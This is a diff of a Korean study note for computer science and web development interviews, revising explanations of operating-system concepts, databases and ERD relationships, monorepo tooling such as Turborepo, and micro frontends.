+  이때 저장되는 문맥 정보는 CPU 레지스터, 프로그램 카운터(PC), 스택 포인터(SP) 등이며, 주로 PCB(Process Control Block) 또는 TCB(Thread Control Block)에 저장되어 된다.
+  문맥 전환은 운영체제가 멀티태스킹을 지원하기 위해 필수적인 작업이며, 스케줄러에 의해 수행된다.
+
+- 특징
+
+  - 문맥 전환은 오버헤드가 발생한다. (저장/복원 시간, CPU 캐시 무효화 등)
+
+  - 너무 빈번한 문맥 전환은 성능 저하를 초래할 수 있다.
+
+  - 스레드 간 문맥 전환이 프로세스 간 문맥 전환보다 비용이 적다.
 
 <br>
 
-### # **문맥 전환(Context Switching)이 무엇인가요?**
+### # 교착 상태(데드락)
+
+- 교착 상태
+
+  교착 상태란, 둘 이상의 프로세스가 서로 상대방이 보유한 자원을 기다리며 무한히 대기하게 되는 상태를 말한다. 이 상태에서는 각 프로세스가 더 이상 진행되지 않으며, 외부의 개입 없이는 절대 풀리지 않는다.
+
+- 교착 상태 발생 조건 (아래 네 가지 조건을 모두 만족해야 교착 상태가 발생)
+
+  - 상호 배제 : 자원은 동시에 여러 프로세스가 사용할 수 없고, 오직 하나의 프로세스만 자원을 점유할 수 있어야 한다.
+
+  - 점유 대기 : 하나 이상의 자원을 점유한 상태에서, 다른 자원을 추가로 요청하며 대기하는 프로세스가 존재한다.
+
+  - 비선점 : 이미 할당된 자원은 강제로 뺏을 수 없고, 오직 그 자원을 점유한 프로세스만 자원을 자발적으로 반납해야 한다.
+
+  - 순환 대기 : 프로세스들이 원형으로 자원을 기다리는 상태이다. (예: P1 → R1 → P2 → R2 → P1 식으로 순환적인 대기가 존재)
 
 <br>
 
-- CPU가 한 개의 Task(프로세스/스레드)를 실행하고 있는 상태에서 다른 Task(프로세스/스레드)로 실행이 전환되는 과정에서 기존의 Task(프로세스/스레드) 상태 및 Register 값들에 대한 정보(문맥, Context)를 저장하고 새로운 Task의 정보(문맥, Context)으로 교체하는 작업을 말한다. 이때 Task(프로세스/스레드)의 정보는 레지스터에 저장되며 PCB로 관리된다.
+### # 가상 메모리(Virtual Memory)
+
+가상 메모리는 물리적 메모리(RAM)의 크기와 관계없이, 각 프로세스에 큰 연속된 메모리 공간을 제공하는 기술이다. CPU는 물리 주소가 아니라, 가상 주소(Virtual Address)를 사용하며, OS와 MMU가 이를 물리 주소로 매핑한다.
 
 <br>
 
-### # **교착상태(데드락)가 무엇이고 발생하는 조건을 설명해 주세요.**
+### # 페이지 폴트
+
+페이지 폴트는 프로세스가 접근하려는 페이지가 물리 메모리에 없는 경우 발생하는 예외(Interrupt)이다. 이는 가상 메모리 시스템에서 흔하게 발생하며, 페이지 테이블의 유효 비트(Valid Bit)를 통해 감지된다.
 
 <br>
 
-- 교착 상태는 프로세스가 자원을 얻지 못해 다음 처리를 하지 못하는 상태로, 시스템적으로 한정된 자원을 여러 곳에서 사용하려고 할 때 발생한다. 상호 배제, 점유 대기, 비선점, 순환 대기 네 가지 조건을 모두 만족해야 교착 상태가 발생한다. 순환 대기의 경우 점유 대기와 비선점 조건을 만족해야 성립하므로 4가지 조건은 완전히 서로 독립적이지 않다.
+### # DTO(Data Transfer Object)
+
+- DTO는 데이터 전달 객체로, 주로 서로 다른 계층 또는 프로세스 간에 데이터를 전송할 때 사용되는 객체이다.
+
+- 비즈니스 로직을 포함하지 않고, 단순히 데이터를 담기 위한 구조체(객체)이다.
+
+- 데이터의 타입, 필수 여부, 옵션 등을 명확히 정의하여 데이터의 유효성 검증 및 명확한 인터페이스 역할을 수행한다.
+
+- 예를 들어, API 요청이나 응답 시 데이터 형식을 정의할 때 자주 활용된다.
 
 <br>
 
-### # **가상 메모리(Virtual Memory)에 대해 설명해 주세요.**
+### # PCB(Process Control Block)에 저장되는 정보
+
+1. 프로세스 식별자 (Process ID): 프로세스의 고유 번호
+
+2. 프로세스 상태: 준비(Ready), 실행(Running), 대기(Waiting) 등 현재 상태
+
+3. 프로그램 카운터(PC): 다음에 실행할 명령어 주소
+
+4. CPU 레지스터 상태: 현재 작업에 필요한 CPU 레지스터 값들
+
+5. CPU 스케줄링 정보: 우선순위, 스케줄링 큐 위치 등
+
+6. 메모리 관리 정보: 페이지 테이블, 세그먼트 테이블 등 메모리 주소 관련 정보
+
+7. I/O 상태 정보 및 열린 파일 목록: 프로세스가 사용하는 입출력 장치 및 열린 파일 리스트
+
+8. 계정 정보 및 기타 관리 정보 (필요한 경우): 사용자 ID, 그룹 ID, CPU 사용 시간 등
 
 <br>
 
-- 가상 메모리는 멀티 프로세스 환경에서 프로세스마다 충분한 메모리를 할당하기에 물리 메모리의 한계가 있어서 나타난 개념이다. 가상 메모리에서 프로세스는 가상 주소를 사용하고, 실제 해당 주소에서 데이터를 읽고 쓸 때 물리 주소로 바꿔주게 된다.
+### # CQRS, 이벤트 소싱
 
-<br>
+- CQRS
 
-### # **페이지 폴트가 무엇인가요?**
+  - 개념: 명령(Command)과 조회(Query)를 분리하는 아키텍처 패턴이다.
 
-<br>
+  - 명령(Command): 시스템 상태를 변경하는 작업 (예: 생성, 수정, 삭제)
 
-- 가상 메모리의 페이지 테이블에는 페이지가 물리 메모리에 있는지, 스왑 영역에 있는지 표시하는 유효 비트를 사용한다. 프로세스가 페이지를 요청했을 때 그 페이지가 메모리에 없는 경우를 페이지 폴트라고 한다. 페이지 폴트가 발생하면 프레임을 새로 할당 받아야 하며, 프로세스가 해당 페이지를 사용할 수 있도록 스왑 영역에서 물리 메모리로 옮겨야 한다. 그리고 페이지 테이블을 재구성 하고, 프로세스의 작업을 재시작한다.
+  - 조회(Query): 시스템 상태를 읽는 작업
 
-<br>
+  - 이렇게 역할을 분리하면 각 작업에 최적화된 모델과 데이터 저장소를 사용할 수 있고, 확장성, 성능, 유지보수성 향상에 도움이 된다.
 
-### # **DTO(Data Transfer Object)가 무엇이죠?**
+- 이벤트 소싱
 
-<br>
+  - 개념: 시스템 상태를 직접 저장하지 않고, 상태 변화를 일으킨 이벤트(사건)들을 순차적으로 저장하는 방식이다.
 
-- DTO는 프로세스 간에 데이터를 전달하는 객체로 로직을 가지지 않는 순수한 데이터 객체이다. 어떠한 값이 어떤 타입을 가지고 이 값이 필수인지 옵션인지 정의하기 위한 파일이라고 알고 있다. 데이터를 검증할 때 데이터를 정의하는 용도로 사용한다.
+  - 시스템 상태는 저장된 이벤트들을 재생(replay)하여 계산된다.
 
-<br>
-
-### # **PCB(Process Control Block)에 저장되는 정보는 어떤 것들이 있나요?**
-
-<br>
-
-(1) 프로세스의 고유 번호
-
-(2) 프로세스 상태 (준비, 대기, 실행 등)
-
-(3) 프로세스를 위해 실행 될 다음 명령어 주소를 포함하는 카운터
-
-(4) 레지스터 관련 정보
-
-(5) CPU 스케줄링 및 프로세스 우선순위
-
-(6) 메모리 관리 시스템 정보
-
-(7) 프로세스의 현재 위치를 나타내는 포인터
-
-(8) 열린 파일 목록
-
-<br>
-
-### # **CQRS, 이벤트 소싱에 대해 아는지?**
-
-<br>
-
-- 이벤트 소싱은 도메인 모델에서 발생하는 모든 이벤트를 기록하는 데이터 저장 기법이다. 또한 CQRS는 시스템의 상태를 변경하는 작업과 시스템의 상태를 반환하는 작업의 책임을 분리하는 것이다. 이벤트 소싱과 CQRS와 함께 사용되면 도메인 모델은 비즈니스 요구에 적합한 다양한 비정규 형상을 가질 수 있다고 알고 있다.
+  - 이벤트들은 불변(immutable)하며, 이력을 모두 저장하므로 감사(audit), 복구, 시간 여행 등 기능 구현에 유리하다
 
 <br><br><br>
 
@@ -10988,11 +11203,23 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # **데이터베이스**
+### # 데이터베이스
 
 - 데이터베이스(Database)
 
-  컴퓨터 시스템에 저장된 정보나 데이터를 모두 모아 놓은 집합이다. 데이터베이스를 사용하는 이유는 메모리에 존재하는 데이터는 오래 보존이 되지 않기 때문에 데이터를 체계적으로 보존하고 관리하기 위해 사용한다.
+  컴퓨터 시스템에 저장된 정보를 체계적으로 모아 놓은 데이터의 집합이며, 여러 사용자와 애플리케이션이 데이터를 효율적으로 저장, 검색, 수정할 수 있도록 관리하는 시스템
+
+- 데이터베이스 사용 이유
+
+  1. 영속성: 메모리에 저장된 데이터는 프로그램 종료 시 사라지지만, 데이터베이스는 데이터를 영구적으로 저장하여 보존한다.
+
+  2. 데이터 무결성 및 일관성 보장 : 무결성(데이터가 정확하고 신뢰할 수 있는 상태를 유지하는 것), 일관성(데이터베이스 트랜잭션이 완료된 후 데이터가 항상 일관된 상태를 유지하는 것)
+
+  3. 효율적인 데이터 관리: 대량의 데이터를 구조적으로 저장하고 빠르게 조회할 수 있음
+
+  4. 동시성 제어: 여러 사용자가 동시에 데이터에 접근할 때 충돌을 방지
+
+  5. 보안 및 접근 제어: 권한에 따라 데이터 접근 제한 가능
 
 <br>
 
@@ -11000,9 +11227,8 @@ function GenericReturnFunc<T>(arg: T): T {
 
 - DBMS란?
 
-  데이터베이스를 ‘데이터의 집합’이라고 정의한다면, 이런 데이터베이스를 관리하고 운영하는 소프트웨어를 DBMS(Database Management System)라고 힌디. 데이터베이스를 운영하고 관리하는 소프트웨어로 계층형, 망형, 관계형 DBMS 중 대부분의 DBMS가 테이블로 구성된 관계형 DBMS(RDMBS)형태로 사용된다.
-
-<br>
+  데이터베이스를 ‘데이터의 집합’이라고 정의한다면, 이런 데이터베이스를 생성, 운영, 관리할 수 있도록 도와주는 소프트웨어를 DBMS(Database Management System)라고 힌디.
+  대부분의 현대 DBMS는 테이블 기반의 관계형 DBMS(RDBMS)이며, 이 외에도 계층형, 망형, 객체지향형 등 다양한 구조가 있다.
 
 - 대표적인 DBMS 종류
 
@@ -11043,7 +11269,9 @@ function GenericReturnFunc<T>(arg: T): T {
 
 - 관계형 데이터베이스(Relational Database)
 
-  데이터 사이의 관계에 기초를 둔 데이터베이스 시스템을 말하고 2차원 테이블로 표현한다. 원투원(두 테이블이 서로가 서로의 오로지 한 로우에만 연결), 원투매니(한 테이블의 로우 하나에 다른 테이블의 로우 여러개가 연결), 매니투매니(중간테이블로 연결, 하나에 다른 테이블의 로우 여러개가 연결)의 관계로 테이블을 연결하며 식별 정보를 나타내는 프라이머리 키와 테이블 관계를 나타내는 폴인 키를 활용하여 각 테이블의 값을 참조한다.
+  데이터 사이의 관계에 기초를 둔 데이터베이스 시스템을 말하고 2차원 테이블로 표현한다. 원투원(두 테이블이 서로가 서로의 오로지 한 로우에만 연결),
+  원투매니(한 테이블의 로우 하나에 다른 테이블의 로우 여러개가 연결), 매니투매니(중간테이블로 연결, 하나에 다른 테이블의 로우 여러개가 연결)의 관계로 테이블을 연결하며 식별 정보를
+  나타내는 프라이머리 키와 테이블 관계를 나타내는 폴인 키를 활용하여 각 테이블의 값을 참조한다.
 
 - 관계형 데이터베이스 매니지먼트 시스템(RDBMS, Relational DataBase Managenet System)
 
@@ -11151,15 +11379,109 @@ function GenericReturnFunc<T>(arg: T): T {
 
     - 기본 키(PK, Primary Key)
 
+      테이블 내에서 각 행을 유일하게 식별할 수 있는 컬럼
+
     - 외래 키(FK, Foreign Key)
+
+      다른 테이블의 기본 키를 참조하여 관계를 나타냄
 
   - 관계 차수 종류
 
     - 일대일 1:1(one to one)
 
+      - 한 테이블의 한 행(row)이 다른 테이블의 한 행과만 연결됨
+
+      - 예: 사용자 ↔ 여권
+
+        - 테이블 구조
+
+          ```md
+          User
+
+          - id (PK)
+          - name
+
+          Passport
+
+          - id (PK)
+          - user_id (FK → User.id, UNIQUE)
+          - passport_number
+          ```
+
+        - 관계 도식
+
+          ```md
+          User (1) ←──→ (1) Passport
+          ```
+
     - 일대다 1:N(one to many)
 
-    - 다대다 N:M(many to maty)
+      - 한 테이블의 한 행이 다른 테이블의 여러 행과 연결됨
+
+      - 예: 블로그(Blog) ↔ 게시글(Post)
+
+        - 한 블로그에는 여러 개의 게시글이 있음
+
+        - 하나의 게시글은 하나의 블로그에만 속함
+
+        - 테이블 구조
+
+          ```md
+          Blog
+
+          - id (PK)
+          - title
+
+          Post
+
+          - id (PK)
+          - blog_id (FK → Blog.id)
+          - content
+          ```
+
+        - 관계 도식
+
+          ```md
+          Blog (1) ←─── (N) Post
+          ```
+
+    - 다대다 N:M(many to mamy)
+
+      - 두 테이블의 여러 행이 서로 다수와 연결됨
+
+      - 이를 구현하기 위해 중간 테이블(조인 테이블)을 사용
+
+      - 예: 학생(Student) ↔ 강의(Course)
+
+        - 한 학생은 여러 강의를 수강할 수 있음
+
+        - 한 강의는 여러 학생이 수강할 수 있음
+
+        - 테이블 구조
+
+          ```md
+          Student
+
+          - id (PK)
+          - name
+
+          Course
+
+          - id (PK)
+          - title
+
+          Enrollment -- 중간 테이블
+
+          - student_id (FK → Student.id)
+          - course_id (FK → Course.id)
+          - enrollment_date
+          ```
+
+        - 관계 도식
+
+          ```
+          Student (N) ←───▶ Enrollment ◀───▶ (N) Course
+          ```
 
 - ERD 설계 단계
 
@@ -11213,21 +11535,59 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
+### # 데이터 무결성, 데이터 일관성
+
+- 데이터 무결성 (Data Integrity)
+
+  - 개념
+
+    데이터가 정확하고 신뢰할 수 있는 상태를 유지하는 것, 무결성을 유지하는 것은 데이터가 잘못 입력되거나 손상되면 시스템 전체가 잘못된 정보를 바탕으로 동작할 수 있기 때문에 매우 중요하다.
+
+  - 종류
+
+    - 개체 무결성(Entity Integrity): 각 행(row)에는 고유한 기본키(primary key)가 반드시 존재해야 함
+
+    - 참조 무결성(Referential Integrity): 외래키(foreign key) 관계가 올바르게 유지되어야 함 — 즉, 참조하는 값이 항상 존재해야 함
+
+    - 도메인 무결성(Domain Integrity): 컬럼에 허용되는 값의 형식, 범위, 제약 조건이 지켜져야 함 (예: 나이는 0 이상, 이메일 형식 등)
+
+    - 사용자 정의 무결성(User-defined Integrity): 비즈니스 규칙에 따른 데이터 조건
+
+- 데이터 일관성 (Consistency)
+
+  - 개념
+
+    데이터베이스 트랜잭션이 완료된 후 데이터가 항상 일관된 상태를 유지하는 것, 즉 데이터베이스에 허용된 규칙(무결성 제약조건, 트랜잭션(여러 작업) 규칙 등)을 항상 만족하는 상태
+
+  - 예시: 은행 계좌 이체 트랜잭션에서 돈이 송금자 계좌에서 차감되고 수취인 계좌에 정확히 더해져야 하며, 중간에 한 쪽만 처리되는 일이 없어야 함
+
+- 무결성은 데이터가 올바르게 저장되고 유지되는 ‘정확성’에 초점, 일관성은 여러 작업(트랜잭션) 후에도 데이터가 ‘정해진 규칙을 지키고 있는 상태’를 뜻함
+
+<br>
+
 ### # 정규화
 
-테이블 간에 중복된 데이터를 허용하지 않는 프로세스이다. 중복된 데이터를 허용하지 않음으로써 무결성를 유지할 수 있으며, DB의 저장 용량 역시 줄일 수 있다.
+정규화는 데이터베이스 설계 과정에서 중복을 최소화하고, 데이터 무결성을 유지하며, 삽입, 수정, 삭제 이상(anomaly)을 방지하기 위해 테이블을 여러 개로 분해하는 과정이다.
 
 <br>
 
 ### # 인덱스
 
-추가적인 쓰기 작업과 저장 공간을 활용하여 데이터베이스 테이블의 검색 속도를 향상시키기 위한 자료구조이다.
+인덱스는 데이터베이스에서 검색 성능을 향상시키기 위해 사용하는 자료구조이다. 마치 책의 목차처럼, 테이블의 특정 열(Column)에 대한 정보를 미리 정렬하여 저장해두는 구조이다.
 
 <br>
 
 ### # SQL
 
-구조화된 질의 언어라는 뜻으로 관계형 데이터베이스에서 사용되는 언어. 표준 SQL을 배우면 대부분의 DBMS를 사용할 수 있다. 즉 DBMS에서 사용하는 언어이다. SQL이 데이터베이스를 조작하는 ‘언어’이긴 하지만 일반적인 프로그래밍 언어(C, 자바, 파이썬 등)와는 조금 다른 특성을 갖는다. SQL은 특정 회사에서 만드는 것이 아니라 국제표준화기구에서 SQL에 대한 표준을 정해서 발표하고 있다. 이를 표준 SQL이라고 한다. 그런데 문제는 SQL을 사용하는 DBMS를 만드는 회사가 여러 곳이기 때문에 표준 SQL이 각 회사 제품의 특성을 모두 포용하지 못한다는 점이다. 그래서 DBMS를 만드는 회사에서는 되도록 표준 SQL을 준수하되, 각 제품의 특성을 반영한 SQL을 사용한다. 3가지 DBMS 제품(오라클, SQL 서버, MySQL)이 모두 표준 SQL을 포함하고 있다. 그래서 표준 SQL을 익히면 대부분의 DBMS에 공통적으로 적용할 수 있다. 각 DBMS는 추가로 자신만의 기능도 가지고 있어서 이렇게 변경된 SQL을 오라클은 PL/SQL, SQL서버는 T-SQL, MySQL은 SQL로 부른다.
+SQL은 Structured Query Language의 약자로, 관계형 데이터베이스(RDBMS)를 조작하고 질의(Query)하기 위한 언어이다. 데이터베이스와의 소통 언어로, 데이터를 조회, 삽입, 수정, 삭제하는 데 사용하며 절차형 언어가 아닌 선언형 언어이다. 어떻게가 아니라 무엇을 할지 기술한다.
+SQL은 국제표준화기구(ISO)에서 정의한 표준 SQL(SQL Standard)이 존재하며 주요 DBMS는 이 표준을 기본적으로 따르며, 필요에 따라 자체 확장된 문법을 포함하기도 한다.
+따라서 표준 SQL만 잘 익혀도 대부분의 DBMS에 적용 가능하며, 각 제품의 전용 문법은 상황에 맞게 학습하면 된다.
+
+| DBMS       | 확장 SQL 이름 | 특징                          |
+| ---------- | ------------- | ----------------------------- |
+| Oracle     | PL/SQL        | Oracle 전용의 프로그래밍 확장 |
+| SQL Server | T-SQL         | Microsoft SQL Server용 확장   |
+| MySQL      | (기본 SQL)    | 표준 SQL + MySQL 전용 함수 등 |
 
 <br><br><br>
 
@@ -11241,49 +11601,95 @@ function GenericReturnFunc<T>(arg: T): T {
 
   - 모놀리식(Monolithic)
 
-    최초의 `모놀리식` 방식은 소스 코드를 모듈화하지 않고 하나의 리포지터리에 모두 넣었다고 생각하면 된다. 모든 코드가 `단일 버전`으로 서로 직접 의존하기 때문에 코드 재사용이 용이하고 빌드 및 배포 과정도 단순하여 소수의 개발자가 빠르게 개발할 수 있다는 장점이 있다.
+    - 개념
 
-    하지만 관심사 분리가 어렵고 기능 추가나 삭제가 레파지토리 전체에 영향을 줄 수 있으며 매번 거대한 프로젝트를 배포해야한다는 단점이 있다.
+      최초의 모놀리식 방식은 애플리케이션의 모든 기능이 하나의 프로젝트 안에서 함께 개발되고 배포되는 구조를 말한다. 모든 코드가 단일 코드베이스로 구성되며, 서로 직접 의존한다.
 
-    이러한 단점을 해결하고자 멀티 레포가 등장하게 된다.
+    - 장점
+
+      1. 코드 재사용이 쉽다.
+
+      2. 빌드 및 배포 과정이 단순해 소수의 개발자가 빠르게 개발할 수 있다.
+
+    - 단점
+
+      1. 관심사 분리가 어렵다.
+
+      2. 하나의 기능을 변경해도 전체 애플리케이션을 다시 빌드하고 배포해야 하는 등 유지보수가 어렵다는 단점이 있다.
 
   - 멀티레포(Multi-Repo)
 
-    `멀티레포` 방식에서는 소스 코드를 모듈화한 뒤 각 모듈에 `독자적인 영역을 부여(별도의 저장소)하고 버전 관리를 통해` 관심을 분리해서 기능 변경이 다른 레파지토리에 직접 영향을 미치지 않도록 개선했다. 다른 프로젝트와 의존성을 가지고 있지 않아 독립적으로 개발이 가능하고 관심사 분리가 쉬우며 개발, 테스트, 빌드 배포가 각각 존재한다.
+    - 개념
 
-    하지만 각 모듈이 서로 독립된 영역에 존재하기 때문에 코드 코드 컨벤션 통일 및 코드 재사용이 어려워지고 관리 포인트가 증가하며 빌드와 배포 과정이 복잡해진다는 단점이 있다.
+      멀티레포는 기능별 또는 도메인별로 소스 코드를 모듈화하고, 각 모듈을 별도의 저장소로 관리하는 구조이다.
+
+    - 장점
+
+      1. 관심사 분리가 쉽다.
+
+      2. 각 모듈이 독립적으로 개발, 테스트, 배포될 수 있어 팀 단위의 작업 분리가 용이하다.
+
+    - 단점
+
+      1. 저장소가 분산되어 있기 때문에 코드 공유와 일관된 컨벤션 유지가 어렵다.
+
+      2. 의존성 관리 및 버전 충돌 등으로 인해 빌드와 배포가 복잡해질 수 있다.
 
   - 모노레포(Mono-Repo)
 
-    `모노레포`는 이와 같은 모놀리식 레파지토리와 멀티레포의 장점을 모두 취하고자 등장했다. 단일 레파지토리에 여러 개의 서브 프로젝트가 존재하는 방식이다. 모노레포의 장점은 아래와 같다.
+    - 개념
 
-    (1) 프로젝트 파악 수월 : 모든 커밋 히스토리가 한 레파지토리에 남기 때문에 히스토리를 추적하거나 전체 레파지토리의 개발 방향을 이해하는 게 쉬워지며 모든 프로젝트의 코드와 자원(assets) 간의 관계와 의존성을 한눈에 확인할 수 있다.
+      모노레포는 여러 개의 프로젝트(또는 패키지)를 하나의 저장소에 함께 관리하는 구조로, 멀티레포의 관심사 분리 장점과 모놀리식의 일관된 개발 환경을 모두 지향한다.
+      모노레포의 대표적인 장점은 다음과 같다. `모노레포`는 이와 같은 모놀리식 레파지토리와 멀티레포의 장점을 모두 취하고자 등장했다. 노레포 구성을 도와주는 프레임워크는 Lerna, yarn workspace, Nx, Turborepo 등이 있다.
 
-    (2) 코드 재사용성 증가 : 여러 곳에서 중복으로 사용하는 자산들(테스트 코드 등)을 공유하고 재사용할 수 있다.
+    - 장점
 
-    (3) 배포, 빌드, 테스트 속도 향상 : 배포와 빌드, 테스트와 같은 작업을 병렬로 한 번에 처리할 수 있으므로 한 번의 명령으로 여러 개의 레파지토리에서 작업을 진행할 수 있다.
+      1. 프로젝트 파악 수월 : 모든 커밋과 변경 이력이 하나의 저장소에 남기 때문에, 히스토리를 추적하거나 전체 구조를 이해하기 쉽다.
 
-    모노레포 구성을 도와주는 프레임워크는 Lerna, yarn workspace, Nx, Turborepo 등이 있다.
+      2. 코드 재사용성 증가 : 공통 코드(예: 유틸 함수, 컴포넌트, 테스트 도구 등)를 하나의 패키지로 관리하며 여러 프로젝트에서 쉽게 사용할 수 있다.
+
+      3. 배포, 빌드, 테스트 속도 향상 : 작업을 병렬로 실행하거나 변경된 프로젝트만 선별적으로 처리할 수 있어 효율적이다.
+
+    - 단점
+
+      1. 초기 설정과 관리가 복잡하다 : 여러 프로젝트를 한 저장소에 관리하려면 빌드 도구, 의존성 관리, 배포 파이프라인을 잘 설계해야 해서 초기 세팅이 까다롭고 복잡할 수 있다.
+
+      2. 대형 저장소로 인한 성능 문제 : 커밋, 검색, 빌드 시 전체 저장소 크기가 커지면 속도가 느려질 수 있다. 특히 Git 히스토리 관리나 CI/CD 빌드 시간이 오래 걸릴 수 있다.
+
+      3. 권한 관리 어려움 : 저장소가 하나라서, 특정 프로젝트나 팀 단위로 권한을 세분화하기가 어렵다. 민감한 프로젝트가 섞여있으면 보안 이슈가 될 수 있다.
+
+      4. 코드 변경 영향 범위 파악 어려움 : 큰 저장소 내에서 공유되고 있는 한 부분을 변경하면 어떤 프로젝트에 영향이 있을지 정확히 파악하기 어려울 수 있다.
 
 - 터포레포(Turborepo)
 
   - 터포레포(Turborepo)란?
 
-    Vercel이 인수한 Turborepo는 JavaScript와 TypeScript 코드 베이스의 모노레포를 위한 고성능 빌드 시스템이다. Vercel과 AWS, Miro, PayPal, Discord, LINE+의 Universal Video Player 등 여러 프로젝트에서 프로덕션 단계로 사용하고 있으며 지금도 활발하게 개발이 진행되고 있다.
+    Vercel이 인수한 Turborepo는 JavaScript와 TypeScript 코드 베이스의 모노레포를 위한 고성능 빌드 시스템이다. Vercel과 AWS, Miro, PayPal, Discord,
+    LINE+의 Universal Video Player 등 여러 프로젝트에서 프로덕션 단계로 사용하고 있으며 지금도 활발하게 개발이 진행되고 있다.
 
-    Turborepo의 주요 미션은 모노레포 환경에서 개발자가 조금 더 쉽고 빠르게 개발할 수 있도록 빌드 도구를 제공하는 것이다. 고급 빌드 시스템을 구축하는 복잡한 과정을 Turborepo가 대신해 주기 때문에 개발자는 복잡한 설정과 스크립트에 신경 쓰는 대신 개발에 더 집중할 수 있다. Turborepo의 기본 원칙은 한 번 작업을 수행하며 수행한 계산은 이후 다시 수행하지 않는 것이다. 따라서 두 번째 실행할 때는 이전에 계산한 작업은 건너뛰고 이전에 캐싱해 놓은 로그를 다시 보여준다.
+    Turborepo의 주요 미션은 모노레포 환경에서 개발자가 조금 더 쉽고 빠르게 개발할 수 있도록 빌드 도구를 제공하는 것이다. 고급 빌드 시스템을 구축하는 복잡한 과정을
+    Turborepo가 대신해 주기 때문에 개발자는 복잡한 설정과 스크립트에 신경 쓰는 대신 개발에 더 집중할 수 있다. Turborepo의 기본 원칙은 한 번 작업을 수행하며
+    수행한 계산은 이후 다시 수행하지 않는 것이다. 따라서 두 번째 실행할 때는 이전에 계산한 작업은 건너뛰고 이전에 캐싱해 놓은 로그를 다시 보여준다.
 
   - 터보레포 특징
 
-    1. Incremental builds : 작업 진행을 캐싱해 이미 계산된 내용은 건너 뛰는 것을 의미한다. 빌드는 딱 한 번만 하는 것을 목표로 한다.
-    2. Content-aware hasing : 타임스탬프가 아닌 콘텐츠를 인식하는 방식으로 해싱을 지원한다. 이를 통해 모든 파일을 다시 빌드하는 것이 아니라 변경된 파일만 빌드한다.
-    3. Cloud caching : 클라우드 빌드 캐시를 팀원 및 CI/CD와 공유한다. 이를 통해 로컬 환경을 넘어 클라우드 환경에서도 빠른 빌드를 제공한다.
-    4. Parallel execution : 모든 코어를 사용하는 병렬 실행을 목표로 한다. 지정된 태스크 단위로 의존성을 판단해 최대한 병렬적으로 작업을 진행한다. (멀티태스킹 능력 극대화)
-    5. Task Pipelines : 태스크 간의 연결을 정의해서 빌드를 언제 어떻게 실행할지 판단해 최적화한다.
-    6. Zero Runtime Overhead : 런타임 코드와 소스 맵을 다루지 않기 때문에 런타임 단계에서 파악하지 못한 리스크가 불거질 위험이 없다.
-    7. Pruned subsets : 빌드에 필요한 요소만으로 모노 레포의 하위 집합을 생성해 PaaS(Platform as a Service) 배포 속도를 높인다.
-    8. JSON configuration : 별도의 코드 작업 없이 JSON 설정으로 터보를 사용할 수 있다.
-    9. Profile in browser : 빌드 프로필로 빌드 과정을 시각화하면 병목 지점을 쉽게 찾을 수 있다.
+    1. 빠른 빌드 속도(Incremental builds) : 작업 결과를 캐싱해서 이미 처리된 부분은 다시 빌드하지 않는다. 빌드를 한 번만 수행하는 것을 목표로 한다.
+
+    2. 빌드 시 변경된 부분만 처리(Content-aware hasing) : 파일 변경 여부를 타임스탬프가 아닌 실제 파일 콘텐츠 기반으로 판단한다. 따라서 변경된 파일만 빌드하여 불필요한 재빌드를 방지한다.
+
+    3. 클라우드 캐시 공유(Cloud caching) : 빌드 캐시를 클라우드에 저장하여 팀원과 CI/CD 환경 간에 공유한다. 덕분에 로컬뿐 아니라 클라우드 환경에서도 빠른 빌드가 가능하다
+
+    4. 병렬 작업(Parallel execution) : 작업(task) 간 의존성을 분석해 가능한 한 모든 CPU 코어를 활용해 병렬로 빌드와 테스트를 실행한다.
+
+    5. 의존성 기반 Task 실행(Task Pipelines) : 작업 간 연결 관계를 정의해 어떤 순서로 빌드를 실행할지 최적화한다.
+
+    6. 불필요한 런타임 오버헤드 없음(Zero Runtime Overhead) : 런타임에 추가 코드나 소스맵을 삽입하지 않아 빌드된 코드의 성능이나 안정성에 영향을 주지 않는다.
+
+    7. PaaS 배포 최적화 (Pruned Subsets) : 모노레포 내에서 필요한 부분만 골라 하위 집합(subset)을 만들어 PaaS 배포 시 효율성을 높인다.
+
+    8. 설정이 비교적 간단(JSON configuration) : 별도 코드 작성 없이 JSON 설정만으로 쉽게 터보레포를 구성하고 사용할 수 있다.
+
+    9. 시각화 도구 제공(Profile in browser) : 빌드 프로파일을 시각화해 쉽게 병목 구간을 파악할 수 있어 성능 최적화에 도움을 준다.
 
 <br>
 
@@ -11291,95 +11697,171 @@ function GenericReturnFunc<T>(arg: T): T {
 
 - Micro Frontends Architecture
 
-  마이크로 프론트엔드 아키텍처란 마이크로 서비스 아키텍처(MSA)의 개념을 프론트엔드 세계로 확장한 개념이다. 마이크로 서비스는 아키텍처는 하나의 서비스가 여러 개의 작은 서비스로 구성되어 독립적으로 개발되고 배포되는 구조를 말한다. 마이크로 서비스처럼 전체 화면을 작동할 수 있는 단위로 나누어 개발한 후 서로 조립하는 방식이다. 여기서 단위는 페이지나 UI 등이 될 수 있다.
+  마이크로 프론트엔드는 마이크로서비스 아키텍처를 프론트엔드에 적용한 개념으로, 각 UI 혹은 페이지 단위를 독립된 애플리케이션처럼 구성하고 조합하여 하나의 웹 앱을 만든다.
+  즉 각각 독립된 환경에서 나누어 개발, 배포되어 조립하는 방식이다.
 
 - Micro Frontends의 적용 시점, 장단점
 
   - 적용 시점
 
-    페이지마다 복잡한 공통 UI가 반복되어 포함되고 그런 와중에도 각 페이지들의 UI 유사성이 높고 크게 연관되어 있으며 여기에 더불어 분절된 각 앱의 크기가 이미 충분히 크고, 복잡도와 도메인 난이도가 높아 배포 단위를 더 잘게 쪼개고 싶은 요구사항이 있는 웹 애플리케이션
+    - 공통 UI가 많고 페이지 간 연관성이 높은 경우
+
+    - 앱 규모가 크고 도메인 복잡도가 높은 경우
+
+    - 배포 단위를 작게 나누고 싶은 경우
 
   - 메인 컨셉
 
     - 컨텍스트 독립성
 
-      - 각 작동 단위들이 같은 프레임워크를 사용하더라도 컨텍스트를 공유해서는 안된다.
+      - 각 앱은 상태, 전역 변수 등을 공유하지 않고 독립적으로 동작해야 한다.
 
-      - 독립적인 애플리케이션을 자체적으로 구축해야하고 상태 공유나 전역 변수에 의존해서는 안된다.
+    - 네임스페이스를 분리
 
-    - 네임스페이스를 활용한 분리
+      - 마이크로 앱 각 작동 단위의 격리(완전히 격리된 환경)가 불가능한 경우 CSS, localStorage, 이벤트, 쿠키 등에 prefix를 붙여 충돌을 방지한다.
 
-      - 각 작동 단위의 격리가 불가능한 경우 네이밍 컨벤션에 따라 prefix 등으로 네임스페이스를 활용한다.
+    - 브라우저 기반 통신
